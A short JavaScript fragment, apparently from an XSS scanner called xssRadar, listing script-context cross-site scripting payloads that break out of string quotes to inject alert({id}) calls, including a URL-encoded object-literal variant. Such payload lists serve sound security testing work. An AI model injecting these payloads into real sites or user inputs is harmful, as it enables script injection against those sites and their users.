xssRadar.scanner.payloads.script = [
  '\';alert({id});',
  'alert({id});',
  "';alert({id})//",
  "\";alert({id})//",
  "'-alert({id})-'",
  "'-alert({id})//",
  "\\'-alert({id})//",
  "%27};alert({id});%0Afoobar={foo:bar%27"
]